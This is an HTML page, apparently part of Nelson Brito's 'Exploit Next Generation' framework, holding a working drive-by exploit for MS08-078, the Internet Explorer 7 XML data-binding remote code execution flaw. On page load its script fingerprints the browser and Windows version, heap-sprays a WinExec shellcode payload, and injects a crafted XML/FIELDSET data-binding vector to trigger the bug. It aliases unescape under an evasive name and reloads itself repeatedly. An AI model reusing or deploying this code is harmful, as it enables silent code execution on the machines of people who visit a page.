<HTML>

<HEAD>
	<TITLE> MS08-078: Exploit Next Generation&reg; Methodology Compliance Module </TITLE>
	<META http-equiv="content-type" content="text/html; charset=UTF-8">
	<META http-equiv="content-style-type" content="text/css"/>
	<META name="author" content="Nelson Brito"/>
	<META name="copyright" content="2004-2011 Nelson Brito"/>
	<META name="description" CONTENT=" MS08-078: Exploit Next Generation&reg; Methodology Compliance Module " />
	<META name="keywords" CONTENT=" MS08-078: Exploit Next Generation&reg; Methodology Compliance Module  "/>
	<SCRIPT SRC="./heapSpray.js" TYPE="text/javascript" LANGUAGE="JavaScript"></SCRIPT>
	<SCRIPT SRC="./getVersion.js" TYPE="text/javascript" LANGUAGE="JavaScript"></SCRIPT>
	<SCRIPT SRC="./asmCode.js" TYPE="text/javascript" LANGUAGE="JavaScript"></SCRIPT>
</HEAD>

<SCRIPT TYPE="text/javascript">
/* 
 * $Id: MS08-078.html,v 1.6 2011-03-21 17:40:18-03 nbrito Exp $
 */

/***************************************************************************
 *        ___________ _______    ________                                  *
 *        \_   _____/ \      \  /  _____/     .__         .__              *
 *         |    __)_  /   |   \/   \  ___   __|  |___   __|  |             *
 *         |        \/    |    \    \_\  \ /__    __/  /__    __/          *
 *        /_______  /\____|__  /\______  /    |__|        |__|             *
 *                \/         \/        \/                                  *
 *                                                                         *
 *                 Exploit Next Generation Methodology                     *
 *                            Release 6.00                                 *
 *                                                                         *
 *                 Copyright (c) 2004-2011 Nelson Brito                    *
 *                          All Rights Reserved                            *
 *                                                                         *
 ***************************************************************************
 * Author: Nelson Brito <nbrito@sekure.org>                                *
 *                                                                         *
 * Copyright (c) 2004-2011 Nelson Brito. All rights reserved worldwide.    *
 ***************************************************************************
 *                                                                         *
 * ENG example is free software;  you  may  redistribute and/or  modify it *
 * under the terms of the 'GNU General Public License' as published by the *
 * Free  Software  Foundation;  Version  2  with  the  clarifications  and *
 * exceptions described below.  This guarantees your right to use, modify, *
 * and redistribute this software under certain conditions. If you wish to *
 * embed ENG technology into  proprietary software,  please,  contact  the *
 * author for an alternative license (contact nbrito@sekure.org).          *
 *                                                                         *
 * This  program  is distributed in the hope that it will  be useful,  but *
 * WITHOUT  ANY  WARRANTY;    without   even   the   implied  warranty  of *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                    *
 * Please, refer to GNU General Public License v2.0 for further details at *
 * http://www.gnu.org/licenses/gpl-2.0.html,  or  in the  LICENSE document *
 * included with ENG.                                                      *
 ***************************************************************************/
var major   = "";
var minor   = "";
var arch    = "";
var name    = "";
var version = "";
var today   = new Date;


/*
 * Thu Dec 30 08:40:34 BRST 2010 -- Refreshing in case of fail.
 */
setTimeout('window.location.reload(true);', 3000);


/* Function Name: MS08-078 Exploit Next Generation Methodology Compliance.

   Description:   MSIE XML Handling Remote Code Execution Vulnerability.

   Targets:       N/A */
function ms08_078(){
	var heapCode, heapSize, heapOffset, theVector, theExploit, showMessage, theMessage;
	var Fail2Detect = unescape;

	getVersion();

	if(name == "IExplorer" && version.match(/7.0/)){ heapSize = 512; }
	else { window.location = "about:blank"; }

	switch(major){
		case "2000":
		case "XP":
		case "2003":
		case "VISTA":
			heapOffset = Fail2Detect("%u0a0a%u0a0a");
			/***************************************************************************
			 * Star Trek Movie (2009)                                                  *
			 ***************************************************************************
			 * -- Kobayashi Maru                                                       *
			 ***************************************************************************
			 * Kirk:  The test itself is a cheat,   isn't it?   I mean you program it  *
			 *        to be unwinnable.                                                *
			 * Spock: Your argument precludes  the possibility of  a no-win scenario.  *
			 * Kirk:  I don't believe in no-win scenarios.                             *
			 * Spock: Then not only did you violate the  rules,   you also  failed to  *
			 *        understand the principal lesson.                                 *
			 * Kirk:  Please, enlighten me.                                            *
			 * Spock: You of all people should know,   Cadet Kirk.   A captain cannot  *
			 *        cheat death.                                                     *
			 * Kirk:  I of all people?                                                 *
			 * Spock: Your father,   Lieutenant George Kirk,   assumed command of his  *
			 *        vessel before being killed in action, did he not?                *
			 * Kirk:  I don't think you like the fact that I beat your test...         *
			 * Spock: Furthermore, you have failed to divine the purpose of the test.  *
			 * Kirk:  Enlighten me again.                                              *
			 * Spock: The purpose is to experience fear.  Fear in the face of certain  *
			 *        death. To accept that fear, and maintain control of oneself and  *
			 *        one's crew.                                                      *
			 *        This is a quality expected in every Starfleet captain.           *
			 ***************************************************************************
			 * "Sorry, Kirk, you cheated and you failed."                              *
			 ***************************************************************************
			 */
			theVector = "<XML ID=I><X><C>&lt;IMAGE SRC='http://&#x0a0a;&#x0a0a;.nbrito.net'/></C></X></XML><FIELDSET><LEGEND DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><XML ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></LEGEND></FIELDSET>";
			break;
		case "Linux":
		default:
			window.location = "about:blank";
			CollectGarbage();
			break;
	}

	heapCode = WinExec;
	heapSpray.Spray(heapCode, heapSize, heapOffset);

	theExploit = document.getElementById("replace");
	theExploit.innerHTML = theVector;
}

function sleep(milliSecond){
	var now = new Date();
	var exitTime = now.getTime() + milliSecond;

	while(true){
		now = new Date();
		if(now.getTime() > exitTime) return;
	}
}
</SCRIPT>
<BODY onLoad="ms08_078();">
	<DIV ID="replace"></DIV>
	<CENTER>
		<SPAN STYLE="font-family:courier new;">
			Exploit Next Generation&reg; Methodology Compliance
		</SPAN>
	</CENTER>
</BODY>
</HTML>

